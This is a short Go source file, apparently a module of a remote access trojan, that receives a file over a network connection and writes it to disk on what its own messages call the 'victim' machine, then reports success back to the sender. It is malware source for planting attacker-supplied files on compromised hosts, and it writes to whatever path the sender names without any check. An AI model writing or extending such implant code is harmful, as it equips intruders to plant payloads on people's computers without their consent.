package download

import (
	"encoding/gob"
	"fmt"
	"net"
	"os"
)

// SendFile struct
type SendFile struct {
	Filename    string
	FileSize    int
	FileContent []byte
}

// CheckExistence (filename string) bool
func CheckExistence(filename string) bool {

	if _, err := os.Stat(filename); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

// ReadFile (connection net.Conn) (err error)
func ReadFile(connection net.Conn) (err error) {
	decoder := gob.NewDecoder(connection)
	fs := &SendFile{}

	err = decoder.Decode(fs)
	file, err := os.Create(fs.Filename)
	if err != nil {
		fmt.Println("[+] Unable to create file ")
	}

	defer file.Close()

	nbytes, err := file.Write(fs.FileContent)

	if err != nil {
		fmt.Println("- Unable to write file")
	}

	fmt.Println("+ Number of Bytes: ", nbytes)

	var status string

	if !CheckExistence(fs.Filename) {
		status = "- Unable to Write file to victim"
		return
	}
	status = "- Successful Write file to victim"

	connection.Write([]byte(status + "\n"))

	return
}
